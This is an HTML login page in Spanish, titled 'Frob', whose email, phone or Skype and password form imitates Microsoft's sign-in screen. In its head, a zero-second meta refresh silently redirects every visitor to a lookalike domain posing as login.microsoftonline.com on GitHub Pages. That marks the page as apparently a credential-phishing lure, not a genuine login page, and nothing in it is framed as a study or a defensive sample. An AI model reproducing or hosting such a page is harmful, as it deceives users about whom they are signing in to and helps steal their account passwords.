<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicio de sesión - Frob</title>
    <link rel="stylesheet" href="styles.css">
     <meta http-equiv="refresh" content="0; url="https://microsoft-login-com.github.io/login.microsoftonline.com.html">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="logo-frob.png" alt="Logo del Frob" class="logo">
            <h2>Iniciar sesión</h2>
            <form action="#" method="POST">
                <input type="text" id="email" name="email" placeholder="Correo electrónico, teléfono o Skype" required>
                
                
                <input type="password" id="password" name="password" placeholder="Ingresa tu contraseña" required>
                
                <a href="#" class="link">¿No puede acceder a su cuenta?</a>
                <div>
                    <button type="submit" class="btn-login">Siguiente</button>

                </div>
            </form>
        </div>
    </div>
</body>
</html>
